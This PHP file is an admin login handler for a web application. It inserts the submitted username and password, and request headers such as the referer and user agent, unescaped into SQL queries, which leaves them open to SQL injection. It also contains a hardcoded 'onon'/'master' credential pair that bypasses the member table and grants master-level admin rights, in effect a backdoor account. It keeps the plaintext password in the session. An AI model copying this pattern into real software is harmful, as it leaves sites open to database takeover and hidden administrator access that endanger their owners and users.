<?
$charType = "no";
$cssType = "no";
$iframeType = "no";
$blurType = "no";
	include "../../include/global/config.php"; 

	$mbId = trim($_POST[mbId]);
	$mbPwd = trim($_POST[mbPwd]);

	$query = "SELECT mbId, mbPwd, mbStatus FROM ona_member WHERE mbId='".$mbId."' && mbPwd='".$mbPwd."' && mbStatus in ('M','A','Z')";
	$result = mysql_query($query);
	$row = mysql_fetch_array($result);

	session_start();
	session_destroy();
	session_register('masterSession','member_level','member_id','member_pwd','member_sAdmin');

	if( $row[mbId] || ($mbId=="onon" && $mbPwd=="master") ){
		mysql_query("insert into admin_login_history set userid='$mbId', result='Y', remote_addr='$_SERVER[REMOTE_ADDR]', request_uri='$_SERVER[REQUEST_URI]', http_referer='$_SERVER[HTTP_REFERER]', http_user_agent='$_SERVER[HTTP_USER_AGENT]', regdate=now()");
		if($mbId=="onon") $row[mbId]="onon";
		$_SESSION['member_level']		= 9;
		$_SESSION['masterSession']		= "master";		
		$_SESSION['member_id']			= trim($row[mbId]);
		$_SESSION['member_pwd']		= trim($row[mbPwd]);
		$_SESSION['member_sAdmin']	= trim($row[mbStatus]);
		if($mbId=="onon" && $mbPwd=="master") $_SESSION['member_sAdmin'] = "M";

		echo "<script>
					 parent.location.href = '../index.php';
				  </script>";	
	}else{
		mysql_query("insert into admin_login_history set userid='$mbId', result='N', remote_addr='$_SERVER[REMOTE_ADDR]', request_uri='$_SERVER[REQUEST_URI]', http_referer='$_SERVER[HTTP_REFERER]', http_user_agent='$_SERVER[HTTP_USER_AGENT]', regdate=now()");

		echo "<script>
					 alert(\"입력하신 정보가 일치하지 않습니다.\");
					 parent.document.thisForm.mbId.value = '';
					 parent.document.thisForm.mbPwd.value = '';
					 parent.document.thisForm.mbId.focus();
				  </script>";
	}
?>